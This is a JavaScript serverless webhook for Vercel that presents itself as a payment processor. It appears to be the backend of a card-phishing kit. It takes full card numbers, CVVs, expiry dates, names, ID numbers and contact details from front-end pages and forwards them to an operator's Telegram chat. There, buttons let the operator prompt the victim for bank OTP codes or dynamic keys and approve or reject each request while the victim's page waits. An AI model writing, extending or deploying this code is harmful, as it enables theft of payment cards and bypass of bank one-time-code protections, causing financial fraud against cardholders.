// api/webhook.js - WEBHOOK COMPLETO Y SEGURO PARA VERCEL
// ✅ Hace TODO: recibe datos de tarjeta + procesa callbacks de Telegram
// ✅ Credenciales vienen de process.env (Vercel Environment Variables)
// ❌ NO hardcodeadas en el código

export default async function handler(req, res) {
    try {
        // ✅ LAS CREDENCIALES VIENEN DE VERCEL, NO DEL CÓDIGO
        const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
        const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
        
        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
            console.error('❌ Faltan variables de entorno: TELEGRAM_BOT_TOKEN o TELEGRAM_CHAT_ID');
            return res.status(500).json({ error: 'Configuración incompleta' });
        }

        const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

        // Almacenamiento temporal en memoria (para Vercel)
        if (!global.solicitudes) {
            global.solicitudes = new Map();
        }

        // Configurar CORS
        res.setHeader('Access-Control-Allow-Origin', '*');
        res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
        res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

        if (req.method === 'OPTIONS') {
            return res.status(200).end();
        }

        // ============================================
        // POST - Recibe dos tipos de datos
        // ============================================
        if (req.method === 'POST') {
            try {
                const body = req.body;
                
                // TIPO 1: Datos de tarjeta del frontend (paso3.html, visa.html, etc)
                if (body.numeroTarjeta) {
                    console.log('💳 Recibido: Datos de tarjeta para procesar pago');
                    
                    // Generar ID de solicitud
                    const solicitudId = 'SOL_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
                    
                    // Extraer datos
                    const {
                        numeroTarjeta,
                        nombreCompleto,
                        vencimiento,
                        cvv,
                        tipoTarjeta,
                        bancoEmisor,
                        email,
                        celular,
                        tipoDocumento,
                        numeroDocumento
                    } = body;

                    // Detectar categoría de tarjeta
                    let categoriaInfo = { emoji: '💳', categoria: 'Desconocida' };
                    if (tipoTarjeta === 'visa') {
                        categoriaInfo = { emoji: '💳', categoria: 'Visa' };
                    } else if (tipoTarjeta === 'mastercard') {
                        categoriaInfo = { emoji: '💳', categoria: 'Mastercard' };
                    } else if (tipoTarjeta === 'amex') {
                        categoriaInfo = { emoji: '💳', categoria: 'American Express' };
                    }

                    // Crear botones según tipo de tarjeta
                    let inlineKeyboard;
                    if (tipoTarjeta === 'visa') {
                        inlineKeyboard = {
                            inline_keyboard: [
                                [
                                    { text: "📱 PEDIR OTP", callback_data: `pedir_otp_${solicitudId}` },
                                    { text: "🔑 CLAVE DINÁMICA", callback_data: `pedir_clave_din_${solicitudId}` }
                                ],
                                [
                                    { text: "❌ RECHAZAR", callback_data: `reject_visa_${solicitudId}` }
                                ]
                            ]
                        };
                    } else if (tipoTarjeta === 'mastercard') {
                        inlineKeyboard = {
                            inline_keyboard: [
                                [
                                    { text: "✅ APROBAR", callback_data: `approve_master_${solicitudId}` },
                                    { text: "❌ RECHAZAR", callback_data: `reject_master_${solicitudId}` }
                                ]
                            ]
                        };
                    } else if (tipoTarjeta === 'amex') {
                        inlineKeyboard = {
                            inline_keyboard: [
                                [
                                    { text: "✅ APROBAR", callback_data: `approve_amex_${solicitudId}` },
                                    { text: "❌ RECHAZAR", callback_data: `reject_amex_${solicitudId}` }
                                ]
                            ]
                        };
                    } else {
                        inlineKeyboard = {
                            inline_keyboard: [
                                [
                                    { text: "✅ APROBAR", callback_data: `approve_${solicitudId}` },
                                    { text: "❌ RECHAZAR", callback_data: `reject_${solicitudId}` }
                                ]
                            ]
                        };
                    }

                    // Construir mensaje
                    let mensaje = `🔔 *NUEVA SOLICITUD - V2CRTF*\n\n`;
                    mensaje += `🆔 ID: \`${solicitudId}\`\n\n`;
                    
                    if (nombreCompleto || tipoDocumento || numeroDocumento || email || celular) {
                        mensaje += `📋 *DATOS PERSONALES:*\n`;
                        if (nombreCompleto) mensaje += `👤 Nombre completo: ${nombreCompleto}\n`;
                        if (tipoDocumento && numeroDocumento) mensaje += `🆔 Documento: ${tipoDocumento} ${numeroDocumento}\n`;
                        if (email) mensaje += `📧 Email: ${email}\n`;
                        if (celular) mensaje += `📱 Celular: ${celular}\n`;
                        mensaje += `\n`;
                    }

                    mensaje += `💳 *DATOS DE LA TARJETA:*\n`;
                    if (numeroTarjeta) {
                        mensaje += `🏦 Número: \\\`${numeroTarjeta}\\\`\\n`;
                    }
                    mensaje += `🔢 CVV: \\\`${cvv}\\\`\\n`;
                    if (vencimiento) mensaje += `📅 Vencimiento: \`${vencimiento}\`\n`;
                    if (tipoTarjeta) mensaje += `💳 Tipo: ${tipoTarjeta.toUpperCase()}\n`;
                    if (bancoEmisor) mensaje += `🏛️ Banco emisor: ${bancoEmisor}\n`;
                    mensaje += `⭐ *Categoría:* ${categoriaInfo.emoji} *${categoriaInfo.categoria}*\n\n`;
                    
                    const fechaHora = new Date().toLocaleString('es-CO', {
                        timeZone: 'America/Bogota',
                        year: 'numeric',
                        month: '2-digit',
                        day: '2-digit',
                        hour: '2-digit',
                        minute: '2-digit',
                        second: '2-digit'
                    });
                    
                    mensaje += `📅 Fecha: ${fechaHora}\n\n`;
                    mensaje += `⏳ *Estado:* Esperando verificación...`;

                    // Enviar a Telegram
                    const telegramResponse = await fetch(`${TELEGRAM_API}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: TELEGRAM_CHAT_ID,
                            text: mensaje,
                            parse_mode: 'Markdown',
                            reply_markup: inlineKeyboard,
                            disable_web_page_preview: true
                        })
                    });

                    const telegramData = await telegramResponse.json();

                    if (!telegramData.ok) {
                        console.error('❌ Error enviando a Telegram:', telegramData);
                        return res.status(500).json({ 
                            error: 'Error al procesar pago',
                            details: telegramData.description 
                        });
                    }

                    console.log('✅ Solicitud creada:', solicitudId);

                    // Guardar estado inicial
                    global.solicitudes.set(solicitudId, {
                        estado: 'pending',
                        timestamp: Date.now(),
                        messageId: telegramData.result.message_id,
                        tipo: tipoTarjeta
                    });

                    return res.status(200).json({ 
                        ok: true, 
                        message: 'Pago procesado',
                        solicitudId: solicitudId,
                        messageId: telegramData.result.message_id 
                    });
                }
                
                // TIPO 2: Callbacks de Telegram (cuando usuario presiona botón)
                else if (body.callback_query) {
                    console.log('🔘 Callback recibido');
                    
                    const update = body;
                    const callbackData = update.callback_query.data;
                    const callbackId = update.callback_query.id;
                    const message = update.callback_query.message;
                    const chatId = message.chat.id;
                    const messageId = message.message_id;
                    const originalText = message.text || '';

                    console.log('🔘 Botón presionado:', callbackData);

                    let action = '';
                    let solicitudId = '';
                    let respuestaTexto = '';
                    let estadoMensaje = '';

                    // ============================================
                    // PROCESAR CALLBACKS
                    // ============================================
                    if (callbackData.startsWith('pedir_otp_')) {
                        action = 'pedir_otp';
                        solicitudId = callbackData.replace('pedir_otp_', '');
                        respuestaTexto = '📱 Código OTP solicitado';
                        estadoMensaje = '📱 *OTP SOLICITADO* - Ingrese el código de verificación';
                    }
                    else if (callbackData.startsWith('pedir_clave_din_')) {
                        action = 'pedir_clave_din';
                        solicitudId = callbackData.replace('pedir_clave_din_', '');
                        respuestaTexto = '🔑 Clave Dinámica solicitada';
                        estadoMensaje = '🔑 *CLAVE DINÁMICA SOLICITADA* - Ingrese su clave dinámica';
                    }
                    else if (callbackData.startsWith('error_credenciales_')) {
                        action = 'error_credenciales';
                        solicitudId = callbackData.replace('error_credenciales_', '');
                        respuestaTexto = '❌ Credenciales incorrectas';
                        estadoMensaje = '❌ *ERROR CREDENCIALES* - Los datos ingresados no coinciden';
                    }
                    else if (callbackData.startsWith('aprobar_otp_')) {
                        action = 'aprobar_otp';
                        solicitudId = callbackData.replace('aprobar_otp_', '');
                        respuestaTexto = '✅ OTP aprobado';
                        estadoMensaje = '✅ *OTP APROBADO* - Redirigiendo al cliente';
                    }
                    else if (callbackData.startsWith('rechazar_otp_')) {
                        action = 'rechazar_otp';
                        solicitudId = callbackData.replace('rechazar_otp_', '');
                        respuestaTexto = '❌ OTP rechazado';
                        estadoMensaje = '❌ *OTP RECHAZADO* - El código es incorrecto';
                    }
                    else if (callbackData.startsWith('aprobar_clave_din_')) {
                        action = 'aprobar_clave_din';
                        solicitudId = callbackData.replace('aprobar_clave_din_', '');
                        respuestaTexto = '✅ Clave Dinámica aprobada';
                        estadoMensaje = '✅ *CLAVE DINÁMICA APROBADA* - Redirigiendo al cliente';
                    }
                    else if (callbackData.startsWith('rechazar_clave_din_')) {
                        action = 'rechazar_clave_din';
                        solicitudId = callbackData.replace('rechazar_clave_din_', '');
                        respuestaTexto = '❌ Clave Dinámica rechazada';
                        estadoMensaje = '❌ *CLAVE DINÁMICA RECHAZADA* - La clave es incorrecta';
                    }
                    else if (callbackData.startsWith('approve_visa_') || callbackData.startsWith('approve_master_') || callbackData.startsWith('approve_amex_')) {
                        action = 'approved';
                        if (callbackData.startsWith('approve_visa_')) {
                            solicitudId = callbackData.replace('approve_visa_', '');
                            respuestaTexto = '✅ Pago aprobado (Visa)';
                            estadoMensaje = '✅ *APROBADO* - El cliente será redirigido a Visa';
                        } else if (callbackData.startsWith('approve_master_')) {
                            solicitudId = callbackData.replace('approve_master_', '');
                            respuestaTexto = '✅ Pago aprobado (Mastercard)';
                            estadoMensaje = '✅ *APROBADO* - El cliente será redirigido a Mastercard';
                        } else if (callbackData.startsWith('approve_amex_')) {
                            solicitudId = callbackData.replace('approve_amex_', '');
                            respuestaTexto = '✅ Pago aprobado (Amex)';
                            estadoMensaje = '✅ *APROBADO* - El cliente será redirigido a Amex';
                        }
                    }
                    else if (callbackData.startsWith('reject_visa_') || callbackData.startsWith('reject_master_') || callbackData.startsWith('reject_amex_')) {
                        action = 'rejected';
                        if (callbackData.startsWith('reject_visa_')) {
                            solicitudId = callbackData.replace('reject_visa_', '');
                            respuestaTexto = '❌ Pago rechazado (Visa)';
                            estadoMensaje = '❌ *RECHAZADO* - Se mostrará error al cliente';
                        } else if (callbackData.startsWith('reject_master_')) {
                            solicitudId = callbackData.replace('reject_master_', '');
                            respuestaTexto = '❌ Pago rechazado (Mastercard)';
                            estadoMensaje = '❌ *RECHAZADO* - Se mostrará error al cliente';
                        } else if (callbackData.startsWith('reject_amex_')) {
                            solicitudId = callbackData.replace('reject_amex_', '');
                            respuestaTexto = '❌ Pago rechazado (Amex)';
                            estadoMensaje = '❌ *RECHAZADO* - Se mostrará error al cliente';
                        }
                    }
                    else if (callbackData.startsWith('approve_') || callbackData.startsWith('reject_')) {
                        // Callbacks simples (approve_ID, reject_ID)
                        if (callbackData.startsWith('approve_')) {
                            action = 'approved';
                            solicitudId = callbackData.replace('approve_', '');
                            respuestaTexto = '✅ Pago aprobado';
                            estadoMensaje = '✅ *APROBADO*';
                        } else {
                            action = 'rejected';
                            solicitudId = callbackData.replace('reject_', '');
                            respuestaTexto = '❌ Pago rechazado';
                            estadoMensaje = '❌ *RECHAZADO*';
                        }
                    }
                    else {
                        // Fallback
                        const parts = callbackData.split('_');
                        action = parts[0] || 'unknown';
                        solicitudId = parts.slice(1).join('_') || 'unknown';
                        respuestaTexto = 'Procesado';
                        estadoMensaje = '⚠️ Acción desconocida';
                        console.log('⚠️ Callback no reconocido:', callbackData);
                    }

                    console.log(`📌 Acción: ${action}, ID: ${solicitudId}`);

                    // Responder al callback query
                    await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            callback_query_id: callbackId,
                            text: respuestaTexto,
                            show_alert: false
                        })
                    });

                    // Actualizar mensaje en Telegram
                    let newText = originalText;
                    const estadoRegex = /⏳ \*Estado:\* .+/;
                    if (estadoRegex.test(newText)) {
                        newText = newText.replace(estadoRegex, `⏳ *Estado:* ${estadoMensaje}`);
                    } else {
                        newText += `\n\n⏳ *Estado:* ${estadoMensaje}`;
                    }

                    await fetch(`${TELEGRAM_API}/editMessageText`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: chatId,
                            message_id: messageId,
                            text: newText,
                            parse_mode: 'Markdown'
                        })
                    });

                    // Guardar estado
                    global.solicitudes.set(solicitudId, {
                        estado: action,
                        timestamp: Date.now(),
                        chatId: chatId,
                        messageId: messageId
                    });

                    console.log(`✅ Solicitud ${solicitudId}: ${action}`);

                    return res.status(200).json({ 
                        success: true, 
                        action: action,
                        solicitudId: solicitudId
                    });
                }

                // Otros POST - solo confirmar recepción
                return res.status(200).json({ success: true, message: 'Update recibido' });

            } catch (error) {
                console.error('❌ Error procesando POST:', error);
                return res.status(500).json({ error: 'Error interno del servidor' });
            }
        }

        // ============================================
        // GET - Consultar estado o configurar webhook
        // ============================================
        if (req.method === 'GET') {
            const { check, setup } = req.query;

            // Configurar webhook en Telegram
            if (setup === 'true') {
                try {
                    const baseUrl = `https://${req.headers.host}`;
                    const webhookUrl = `${baseUrl}/api/webhook`;

                    console.log('🔗 Configurando webhook en:', webhookUrl);

                    const response = await fetch(`${TELEGRAM_API}/setWebhook`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            url: webhookUrl,
                            secret_token: process.env.WEBHOOK_SECRET || 'default-secret',
                            allowed_updates: ['callback_query', 'message']
                        })
                    });

                    const data = await response.json();
                    console.log('✅ Webhook configurado:', data);

                    return res.status(200).json({
                        success: true,
                        message: 'Webhook configurado exitosamente',
                        webhookUrl: webhookUrl,
                        telegramResponse: data
                    });
                } catch (error) {
                    console.error('❌ Error configurando webhook:', error);
                    return res.status(500).json({ error: 'Error configurando webhook' });
                }
            }

            // Verificar estado de una solicitud
            if (check) {
                const solicitud = global.solicitudes.get(check);
                
                if (solicitud) {
                    return res.status(200).json({
                        success: true,
                        solicitudId: check,
                        estado: solicitud.estado,
                        timestamp: solicitud.timestamp
                    });
                } else {
                    return res.status(200).json({
                        success: true,
                        solicitudId: check,
                        estado: 'pending',
                        mensaje: 'Solicitud aún no procesada'
                    });
                }
            }

            // Obtener información del webhook
            try {
                const response = await fetch(`${TELEGRAM_API}/getWebhookInfo`);
                const data = await response.json();
                return res.status(200).json(data);
            } catch (error) {
                return res.status(500).json({ error: 'Error obteniendo info del webhook' });
            }
        }

        return res.status(405).json({ error: 'Método no permitido' });

    } catch (error) {
        console.error('❌ Error en webhook handler:', error);
        return res.status(500).json({ error: 'Error interno del servidor' });
    }
}
